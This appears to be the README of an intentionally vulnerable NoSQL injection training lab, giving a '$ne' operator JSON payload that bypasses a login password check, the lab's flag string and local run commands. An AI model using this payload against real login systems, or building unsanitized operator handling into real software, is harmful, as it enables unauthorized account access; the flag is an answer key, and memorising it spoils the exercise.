# NoSQL Injection Lab (Intentionally Vulnerable)

Educational only. Isolated lab. Fake in-memory data.

## Vulnerability

Login accepts JSON and applies Mongo-like operators (`$ne`, `$gt`, `$regex`) without sanitization.

Example payload:

```json
{
  "username": "admin",
  "password": { "$ne": "" }
}
```

## Flag

```
KSL{nosql_operator_injection_bypass}
```

## Run

```bash
cd labs/nosql-injection
npm install
npm start
# http://localhost:4002
```
